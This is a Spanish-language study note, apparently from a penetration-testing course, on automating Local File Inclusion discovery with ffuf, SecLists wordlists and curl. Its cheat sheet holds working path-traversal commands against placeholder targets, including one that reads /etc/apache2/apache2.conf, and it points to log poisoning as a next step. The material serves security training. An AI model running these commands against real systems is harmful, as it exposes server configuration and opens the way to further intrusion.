---
tags:
  - LFI
  - autorecon
  - webapp
---
## Conceptos Clave (TL;DR)

* Aunque la explotación manual de LFI es fundamental para evadir firewalls o WAFs, existen métodos automatizados para identificar y explotar vulnerabilidades triviales de forma rápida.

* Los parámetros ocultos o expuestos que no están vinculados a formularios HTML suelen tener menos medidas de seguridad, lo que hace vital realizar fuzzing de parámetros durante el reconocimiento.

* El fuzzing de archivos del servidor permite descubrir rutas críticas como el "webroot" y configuraciones internas, lo cual es necesario para escalar la vulnerabilidad mediante referencias absolutas o envenenamiento de logs.

* Las herramientas específicas para la explotación de LFI suelen estar abandonadas y depender de Python 2, por lo que el enfoque más confiable es utilizar herramientas estándar de fuzzing combinadas con wordlists especializadas.

  

## Herramientas Clave

* **ffuf**: Utilizado para realizar fuzzing de parámetros GET/POST expuestos y para iterar cargas útiles (payloads) de LFI de forma masiva.

* **curl**: Permite la verificación manual de los payloads descubiertos y facilita la lectura directa del contenido de los archivos de configuración.

* **SecLists**: Colección de wordlists recomendada, destacando listas para nombres de parámetros y payloads específicos como `LFI-Jhaddix.txt`.

* **Herramientas Legacy (LFISuite, LFiFreak, liffy)**: Herramientas automatizadas mencionadas por su capacidad de automatizar el proceso, aunque no son una solución fiable a largo plazo por su falta de mantenimiento y precisión.

  
## Metodología Paso a Paso

1. **Fuzzing de Parámetros**: Localizar parámetros GET/POST que no se encuentren expuestos en el frontend de la aplicación web, ya que estos suelen carecer de sanitización.

2. **Escaneo de Payloads LFI**: Utilizar wordlists robustas (como `LFI-Jhaddix.txt`) contra el parámetro identificado para inyectar cargas útiles comunes y técnicas de evasión simultáneamente.

3. **Validación Manual**: Verificar individualmente los payloads que retornan una respuesta exitosa en el escaneo automatizado para confirmar si efectivamente exponen el contenido del archivo objetivo.

4. **Fuzzing de Archivos del Servidor**: Realizar escaneos adicionales para ubicar rutas importantes como el directorio raíz web (webroot) o los archivos de configuración, iterando rutas absolutas y relativas.

5. **Lectura de Configuraciones y Variables**: Analizar manualmente el contenido de las configuraciones reveladas para extraer variables de entorno globales (como variables de logs) que guíen ataques posteriores.


## Cheat Sheet de Comandos

##### Fuzzing para descubrir parámetros ocultos en una URL:
```bash
# -w: Especifica la wordlist y el keyword FUZZ
# -u: Define la URL objetivo, colocando FUZZ como el nombre del parametro GET
# -fs: Filtra el output ignorando las respuestas que tengan el tamano base (modificar segun la aplicacion)

ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<TARGET_IP>:<PORT>/index.php?FUZZ=value' -fs <BASE_RESPONSE_SIZE>
```
##### Fuzzing de un parámetro vulnerable con una wordlist de payloads LFI:
```bash
# -w: Especifica la wordlist de payloads LFI (Jhaddix)
# -u: Inyecta el payload FUZZ directamente como valor del parametro vulnerable (ej. language)

ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<TARGET_IP>:<PORT>/index.php?<PARAMETER>=FUZZ' -fs <BASE_RESPONSE_SIZE>
```
##### Fuzzing para identificar el path del Webroot:
```bash
# -w: Wordlist con directorios webroot por defecto de Linux o Windows
# -u: Usa un path traversal generico y anade la ruta FUZZ seguida de un archivo conocido (ej. index.php)

ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<TARGET_IP>:<PORT>/index.php?<PARAMETER>=../../../../FUZZ/index.php' -fs <BASE_RESPONSE_SIZE>
```
##### Fuzzing preciso para encontrar archivos de configuración o logs:
```bash
# Se recomienda usar una wordlist especifica del Sistema Operativo para mayor precision
# Se concatenan directorios hacia atras (../) seguidos de las rutas de configuracion absolutas

ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<TARGET_IP>:<PORT>/index.php?<PARAMETER>=../../../../FUZZ' -fs <BASE_RESPONSE_SIZE>
```
##### Extracción manual de archivos mediante curl:
```bash
# Solicitud GET simple para leer el archivo de configuracion o entorno recien descubierto

curl http://<TARGET_IP>:<PORT>/index.php?<PARAMETER>=../../../../etc/apache2/apache2.conf
```

---
#### Wordlists Intersantes

**Rutas Windows**
```python
https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows
```

**Rutas Linux**
```python
https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
```

---

## "Gotchas" y Troubleshooting

* **Precisión de Wordlists**: Las wordlists amplias como `LFI-Jhaddix.txt` pueden omitir archivos de configuración y logs específicos de ciertas distribuciones, por lo que suele ser necesario realizar escaneos precisos con wordlists específicas para el sistema operativo objetivo (Linux o Windows).

* **Resolución de Variables Internas**: Las ubicaciones de los logs en los archivos de configuración no siempre son rutas estáticas absolutas. Es común que utilicen variables globales de Apache (como `${APACHE_LOG_DIR}`). Para resolver la ruta real, se debe extraer el archivo que define estas variables, típicamente `/etc/apache2/envvars`.

* **Ajuste de Path Traversal**: Al escanear en busca de directorios base o configuraciones del sistema, es crítico inyectar la cantidad correcta de saltos de directorio (ej. `../../../../`) antes de incluir el payload que se está fuzzeando para asegurar el acceso a la raíz.

* **Falsos Negativos de Herramientas**: Las herramientas exclusivas de automatización LFI pueden pasar por alto vulnerabilidades que requieren un simple ajuste o bypass manual, reduciendo su utilidad en entornos complejos.